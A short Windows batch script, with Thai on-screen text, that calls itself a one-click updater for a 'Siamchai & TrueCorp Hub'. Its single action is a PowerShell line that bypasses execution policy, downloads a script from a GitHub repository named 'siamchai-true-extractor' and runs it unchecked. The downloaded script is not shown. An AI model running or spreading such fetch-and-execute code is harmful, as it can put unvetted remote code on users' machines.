@echo off
chcp 65001 >nul
title ระบบอัปเดตอัตโนมัติ Siamchai ^& True Hub
cd /d "%~dp0"

echo ==================================================================
echo         ระบบอัปเดตอัตโนมัติ: Siamchai ^& TrueCorp Hub
echo                (คลิกเดียว อัปเดตและแก้ปัญหาทันที)
echo ==================================================================
echo.
echo กำลังเชื่อมต่อไปยังเซิร์ฟเวอร์เพื่ออัปเดตระบบ กรุณารอสักครู่...
echo.

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'Stop'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $f = Join-Path $env:TEMP 'update_client.ps1'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mongkholkp001-sys/siamchai-true-extractor/main/update_client.ps1' -OutFile $f -UseBasicParsing; & $f"

echo.
echo กดปุ่มใดก็ได้เพื่อปิดหน้าต่างนี้...
pause >nul
